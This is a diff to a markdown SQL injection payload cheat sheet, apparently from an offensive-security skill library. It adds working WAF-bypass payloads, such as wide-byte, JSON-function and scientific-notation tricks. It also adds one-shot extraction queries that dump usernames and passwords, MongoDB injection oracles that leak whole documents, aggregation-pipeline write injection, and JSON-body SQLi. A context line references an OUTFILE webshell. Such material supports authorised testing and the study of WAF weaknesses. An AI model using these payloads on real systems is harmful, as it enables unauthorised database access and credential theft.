@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, sqli, web, database]
 sources: []
 date_created: 2026-06-05
-date_updated: 2026-06-29
+date_updated: 2026-11-09
 ---
 
 # Payloads: SQLi
@@ -53,7 +53,55 @@ MySQL: INTO OUTFILE webshell (FILE priv + writable webroot)
 ## WAF bypass
 ```
 /*!50000SELECT*/   UNI/**/ON SE/**/LECT   %0bUNION   SeLeCt   +UNION+ALL+SELECT+
+UNION(SELECT(1),2,3)                    parens only, zero spaces
+=  -> LIKE / BETWEEN n AND n / REGEXP    operator substitution
+,  -> FROM (SELECT 1)a JOIN (SELECT 2)b  comma removal
+AND/OR -> &&/||                          symboliclogical
+%bf%27                                   GBK wide byte (eats addslashes escape)
 ```
+
+Discipline: fingerprint WHICH layer blocked you (block-page byte length
+per layer; an app "SQL injection detected" string is the app filter,
+not the WAF), rotate ONE dimension per re-fire, substitute only the
+blocked token, re-run the boolean canary after every rotation. Full
+ladder: `skills/exploit/hunt/hunt-sqli/references/waf-bypass.md`.
+
+### JSON-function bypass (2025; beat AWS/Cloudflare/Imperva/F5/Palo Alto)
+```
+' OR JSON_LENGTH('{}') <= 8896 UNION DISTINCTROW SELECT @@version #
+' OR JSON_OBJECT('a',1)    ' OR JSON_VALUE('{"a":1}','$.a')    col->'$.a'
+```
+WAFs tokenize JSON functions as benign API traffic; rotate the function
+when one gets signed. Tell: a param already carrying `JSON_LENGTH`/
+`->` = the app itself speaks JSON functions (surface pre-validated).
+
+### Scientific notation (defeats AWS WAF; `.` is parser whitespace)
+```
+1' or 1.e(1) or '1'='1
+```
+
+### One-shot extraction (WAF rate-limit windows)
+```sql
+-- DIOS: duplicate-entry floor(rand(0)*2) errors chain-carry the schema
+make_set(6,@:=0x0a,(select database()),...)
+-- json_arrayagg: 16MB vs GROUP_CONCAT's 1024 chars (MySQL >=5.7.22)
+(SELECT json_arrayagg(concat_ws(':',user,password)) FROM users)
+```
+
+## NoSQL 2025 oracles (MongoDB)
+```
+'; throw new Error(JSON.stringify(this)); '    error-dumps the FULL first
+                                               document; iterate with
+                                               if(!['bob'].includes(this.username)){throw ...}
+"$expr": {"$toInt": ["$username"]}             cast error shows the value
+","username":{"$ne":""},"$where":"1            duplicate-key last-value-wins
+                                               strips filter preconditions
+'||1||'x   '||1%00   '||'X                     $where terminators
+```
+Aggregation-pipeline injection (tell: the param IS the stage array,
+`$match`/`$lookup` shapes): `$lookup`/`$unionWith` cross-collection
+read; `$replaceWith`+`$merge` (whenNotMatched:insert) = INSERT;
+`$set`+`$merge` on `_id` = UPDATE.
 
 ## Second-order (test ALL quote contexts)
 First-order input (login/register) is often parameterized while the same STORED value is
@@ -167,3 +215,26 @@ Fallbacks: fuzz candidate webroots with the SecLists default-web-root-directory 
 of NULL kills this whole lane before you start; see [[sql-injection]] for the precheck.
 
 <!-- promoted-slug: outfile-webroot-webshell -->
+
+## JSON-syntax SQLi (structured bodies dodge SQL-aware WAF rules)
+
+When the app builds SQL from JSON body fields, most WAF rule sets inspect the classic query
+string and URL-encoded parameters and pass valid JSON straight through. The injection lives
+INSIDE a JSON string value, so quote-escape logic must respect JSON: `\"` is the only escape
+the app sees after `JSON.parse`, and single quotes need no escaping at all.
+
+{"email":"' OR 1=1-- -","password":"x"}
+{"filter":{"$where":"this.password.match(/^a/)"}}          # bridges into NoSQL on Mongo-backed APIs
+{"id":"1 UNION SELECT version(),2,3-- -"}                  # backend still concatenates into SQL
+
+Postgres/MySQL JSON operators give quote-free extraction when the column itself is JSON-typed
+(no `UNION` needed): `data::jsonb->>'password'`, `JSON_EXTRACT(data,'$.pw')`, and `@>`
+containment tests as a boolean oracle:
+{"q":"x') OR (data::jsonb @> '{\"role\":\"admin\"}')-- -"}
+
+The parser-trust angle is the generic lesson: the WAF parses the body as one format, the ORM
+or hand-built query parses it as another (duplicate keys, `__proto__`-shaped keys, unicode
+escapes), so send SQL intent through whichever representation the reader ignores.
+Sources: https://www.vulnsy.com/cheat-sheets/sql-injection ,
+https://nhimg.org/faq/why-do-json-payloads-still-bypass-wafs-in-sql-injection-attacks/ ,
+https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
